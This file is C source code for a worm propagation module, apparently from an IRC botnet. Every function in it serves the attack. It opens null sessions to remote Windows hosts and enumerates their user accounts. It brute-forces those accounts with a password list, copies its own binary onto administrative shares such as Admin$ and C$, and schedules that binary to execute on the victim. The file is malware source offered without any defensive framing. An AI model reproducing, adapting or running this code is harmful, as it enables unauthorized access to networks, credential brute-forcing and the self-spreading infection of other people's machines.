#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_NETBIOS
int NetConnect(char *szUserName, char *szPassWord, char *szServer, EXINFO exinfo);
BOOL RootBox(char *szUserName, char *szServer, EXINFO exinfo);

BOOL NetConnect(char *szUsername, char *szPassword, char *szServer, EXINFO exinfo)
{
	NETRESOURCE nr;
	memset(&nr,0,sizeof(NETRESOURCE));
	nr.lpRemoteName=szServer;
	nr.dwType=RESOURCETYPE_DISK;
	nr.lpLocalName=NULL;
	nr.lpProvider=NULL;

	// Call the WNetAddConnection2 function to make the connection,
	//   specifying a persistent connection.
	DWORD dwResult = fWNetAddConnection2(&nr, (LPSTR)szPassword, (LPSTR)szUsername, 0);
	if(dwResult != NO_ERROR) {
		Sleep (10);
		fWNetCancelConnection2(szServer,CONNECT_UPDATE_PROFILE,TRUE);
		return FALSE; 
	}

	WCHAR wszNetbios[200], wszFilename[MAX_PATH];
	char *sharepath[]={"Admin$\\system32","c$\\winnt\\system32","c$\\windows\\system32","c","d"};

	TIME_OF_DAY_INFO *tinfo=NULL;
	DWORD JobID;
	AT_INFO at_time;

	MultiByteToWideChar(CP_ACP,0,szServer,-1,wszNetbios,sizeof(wszNetbios));
	NET_API_STATUS nStatus=fNetRemoteTOD(wszNetbios,(LPBYTE *)&tinfo);
	if (nStatus == NERR_Success) {
		if (tinfo) {
			//_snprintf(buffer,sizeof(buffer),"[%s]: Connected to IP: %s (%s/%s).", exploit[exinfo.exploit].name,szServer, szUsername, szPassword);
			//addlog(buffer);

			int j = 0;
			for (int i=0;i<(sizeof(sharepath) / sizeof(LPTSTR));i++) {
				char *szRemoteFile = (char*)malloc(strlen(szServer)+strlen(sharepath[i])+strlen(filename)+1);
				sprintf(szRemoteFile,"%s\\%s\\%s",szServer,sharepath[i],filename);
				if ((j=CopyFile(filename,szRemoteFile,FALSE)) != 0)
					break;
				else if (GetLastError() == ERROR_ACCESS_DENIED) {
					if (_access(szRemoteFile,00) == 0) {
						szRemoteFile[strlen(szRemoteFile)-5] = (char)((rand()%10)+48);
						if ((j=CopyFile(filename,szRemoteFile,FALSE)) != 0)
							break;
					}
				}
				free(szRemoteFile);
			}
			if (!j) {
				fNetApiBufferFree(tinfo);
				fWNetCancelConnection2(szServer,CONNECT_UPDATE_PROFILE,TRUE);
				return FALSE;
			}
				
			DWORD jobtime=tinfo->tod_elapsedt / 60;
			jobtime-=tinfo->tod_timezone;
			jobtime+=2;
			jobtime%=(24*60);
			memset(&at_time,0,sizeof(AT_INFO));
			at_time.JobTime=jobtime*60000;
			MultiByteToWideChar(CP_ACP,0,filename,-1,wszFilename,sizeof(wszFilename));
			at_time.Command=wszFilename; 

			if ((nStatus=fNetScheduleJobAdd(wszNetbios,(BYTE *)&at_time,&JobID)) == NERR_Success) 
				AddEx(exinfo,false);
		}
	}
	fWNetCancelConnection2(szServer,CONNECT_UPDATE_PROFILE,TRUE);

	return TRUE;
}

BOOL RootBox(char *szUsername, char *szServer, EXINFO exinfo)
{
	int i=0;
	while (passwords[i]) {
		if (NetConnect(szUsername,passwords[i],szServer,exinfo) == TRUE) 
			return TRUE;
		Sleep(200);
		i++;
	}
	return FALSE;
}

bool NetBios(EXINFO exinfo)
{
	char szUsername[300], szServer[18];
	WCHAR *pszServerName = NULL,sName[500];
	LPUSER_INFO_0 pBuf=NULL, pTmpBuf;
	DWORD dwLevel=0, dwPrefMaxLen=MAX_PREFERRED_LENGTH, dwEntriesRead=0,
		dwTotalEntries=0, dwResumeHandle=0, dwTotalCount=0;
	NET_API_STATUS nStatus;

	NETRESOURCEW nr;
	if (!ConnectViaNullSession(exinfo.ip, &nr)) 
		return false;

	sprintf(szServer,"\\\\%s",exinfo.ip);
	MultiByteToWideChar(CP_ACP,0,szServer,-1,sName,sizeof(sName));
	pszServerName=sName;
	
	do {
		nStatus = fNetUserEnum(pszServerName, dwLevel, FILTER_NORMAL_ACCOUNT, (LPBYTE*)&pBuf,
			dwPrefMaxLen, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);
		CloseNullSession(exinfo.ip);

		// If the call succeeds,
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
			if ((pTmpBuf = pBuf) != NULL) {
				for (DWORD i = 0; (i < dwEntriesRead); i++) {
					if (pTmpBuf == NULL) 
						break;
					WideCharToMultiByte(CP_ACP,0,pTmpBuf->usri0_name,-1,szUsername,sizeof(szUsername),NULL,NULL);

					if ((RootBox(szUsername,szServer,exinfo))==TRUE) 
						break;
					pTmpBuf++;
					dwTotalCount++;
				}
			}
		}
		if (pBuf != NULL) {
			fNetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	} while (nStatus == ERROR_MORE_DATA);

	if (pBuf != NULL) 
		fNetApiBufferFree(pBuf);

	if (nStatus == ERROR_ACCESS_DENIED) {
		for (int i=0; usernames[i]; i++) {
			if ((RootBox(usernames[i],szServer,exinfo))==TRUE) 
				break;
			
		}
	}
	
	return true;
}
#endif